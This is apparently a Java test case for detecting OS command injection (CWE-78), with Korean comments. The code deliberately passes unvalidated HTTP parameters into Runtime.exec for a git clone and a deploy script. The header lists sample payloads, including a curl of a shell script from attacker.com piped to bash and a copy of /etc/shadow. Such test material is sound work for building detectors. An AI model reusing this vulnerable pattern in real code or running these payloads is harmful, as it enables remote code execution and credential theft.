package com.example.devops;

import javax.servlet.http.HttpServletRequest;

/**
 * CI/CD 파이프라인 실행기 — Git 기반 자동 배포 시스템
 *
 * 소규모 DevOps 팀의 내부 배포 자동화 도구.
 * "내부망 전용"이라는 이유로 보안 리뷰 없이 운영 중인 레거시 컴포넌트.
 *
 * 발견된 취약점 시나리오:
 *   - branch 파라미터: "main; curl http://attacker.com/shell.sh | bash"
 *   - repoUrl 파라미터: "https://legit.com/repo.git; id > /tmp/rce"
 *   - configScript 파라미터: "deploy.sh; cat /etc/shadow > /tmp/leak"
 *
 * 결과: 배포 서버에서 임의의 OS 명령어가 root 권한으로 실행됨 (IV-1.5, CWE-78)
 */
public class Complex_IV_1_5 {

    private static final String GIT_BIN   = "/usr/bin/git";
    private static final String BASH_BIN  = "/bin/bash";
    private static final String WORK_ROOT = "/opt/ci-workspace";

    /**
     * 브랜치 클론 후 배포 스크립트 실행 — exec() Sink 2개 보유
     *
     * 취약 지점 1 (gitCloneCmd): branch + repoUrl 파라미터 미검증 삽입
     * 취약 지점 2 (deployCmd):   environment + configScript 파라미터 미검증 삽입
     */
    public int executePipeline(HttpServletRequest request) throws Exception {

        // ① Source — 파이프라인 실행 파라미터 (4개 외부 입력)
        String repoUrl      = request.getParameter("repoUrl");      // 클론할 저장소 URL
        String branch       = request.getParameter("branch");       // 배포 브랜치명
        String environment  = request.getParameter("environment");  // 배포 환경 (prod/staging)
        String configScript = request.getParameter("configScript"); // 배포 설정 스크립트 파일명

        // ② Propagation 1단계 — 작업 디렉터리 결정 (environment 오염)
        String workDir = WORK_ROOT + "/" + environment;             // taint: environment

        // ③ Propagation 2단계 — 클론 대상 경로 (branch 합류)
        String cloneTarget = workDir + "/" + branch;               // taint: environment + branch

        // ④ Propagation 3단계 — git clone 명령어 조합 (branch, repoUrl, cloneTarget 합류)
        //    branch + repoUrl 직접 삽입 → 명령어 인젝션
        String gitCloneCmd = GIT_BIN + " clone"
                           + " --branch " + branch                  // taint: branch
                           + " --depth 1"
                           + " " + repoUrl                          // taint: repoUrl
                           + " " + cloneTarget;                     // taint propagation

        // ⑤ Propagation 4단계 — 배포 스크립트 경로 (configScript 합류)
        String scriptPath = cloneTarget + "/deploy/" + configScript; // taint: environment + branch + configScript
        String deployCmd  = BASH_BIN + " " + scriptPath;            // taint propagation

        // ⑥ Sink 1 — git clone 명령어 실행 (IV-1.5 탐지: branch + repoUrl 오염)
        Runtime rt = Runtime.getRuntime();
        Process cloneProc = rt.exec(gitCloneCmd);   // SINK 1: IV-1.5 OS 명령어 삽입
        int cloneExit = cloneProc.waitFor();

        if (cloneExit != 0) {
            return cloneExit;
        }

        // ⑦ Sink 2 — 배포 스크립트 실행 (IV-1.5 탐지: configScript 오염)
        Process deployProc = rt.exec(deployCmd);    // SINK 2: IV-1.5 OS 명령어 삽입
        return deployProc.waitFor();
    }
}
